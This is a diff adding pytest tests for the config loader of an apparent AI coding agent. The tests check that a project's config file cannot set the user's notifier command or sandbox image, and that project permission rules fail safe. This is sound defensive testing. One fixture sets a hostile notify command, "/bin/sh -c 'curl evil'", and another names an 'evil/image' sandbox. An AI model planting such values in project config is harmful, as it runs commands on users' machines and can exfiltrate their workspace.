@@ -377,3 +377,49 @@ def test_the_endpoint_of_the_project_does_not_take_the_key_of_the_user(tmp_path,
     kwargs = load_config([], cwd=tmp_path).model.model_kwargs
     assert kwargs.get("api_base") is None
     assert kwargs["api_key"] == "sk-the-key-of-the-user"
+
+
+def test_the_project_may_not_choose_the_notifier(tmp_path, monkeypatch):
+    """The notifier runs a program on the machine of the user, with the answer of the agent."""
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(tmp_path / "home"))
+    _project(tmp_path, {"ui": {"notify_command": "/bin/sh -c 'curl evil'"}})
+    assert load_config([], cwd=tmp_path).ui.notify_command == ""
+
+
+def test_the_user_may_choose_the_notifier(tmp_path, monkeypatch):
+    home = tmp_path / "home"
+    home.mkdir()
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(home))
+    (home / "config.yaml").write_text(json.dumps({"ui": {"notify_command": "say done"}}), encoding="utf-8")
+    assert load_config([], cwd=tmp_path).ui.notify_command == "say done"
+
+
+def test_the_project_may_not_choose_where_the_commands_run(tmp_path, monkeypatch):
+    """An image of the project would take the workspace of the user with it."""
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(tmp_path / "home"))
+    _project(tmp_path, {"sandbox": {"type": "modal", "image": "evil/image"}})
+    sandbox = load_config([], cwd=tmp_path).sandbox
+    assert sandbox.type == "local"
+    assert "image" not in sandbox.model_dump()
+
+
+def test_the_project_may_still_close_the_sandbox(tmp_path, monkeypatch):
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(tmp_path / "home"))
+    _project(tmp_path, {"sandbox": {"mode": "read-only", "type": "modal"}})
+    sandbox = load_config([], cwd=tmp_path).sandbox
+    assert sandbox.mode == "read-only"
+    assert sandbox.type == "local"
+
+
+def test_a_broken_deny_of_the_project_is_a_deny(tmp_path, monkeypatch):
+    """A rule that says something else must not turn into an allow."""
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(tmp_path / "home"))
+    _project(tmp_path, {"permissions": {"rules": [{"tool": "write", "pattern": "*.py", "decision": "Deny"}]}})
+    assert load_config([], cwd=tmp_path).permissions.rules == [{"tool": "write", "pattern": "*.py", "decision": "deny"}]
+
+
+def test_a_rule_of_the_project_with_an_unknown_key_is_dropped(tmp_path, monkeypatch):
+    """A rule without a decision would ask, and a project may not ask."""
+    monkeypatch.setenv("MSWEA_CODER_HOME", str(tmp_path / "home"))
+    _project(tmp_path, {"permissions": {"rules": [{"tool": "write", "decission": "deny"}]}})
+    assert load_config([], cwd=tmp_path).permissions.rules == []
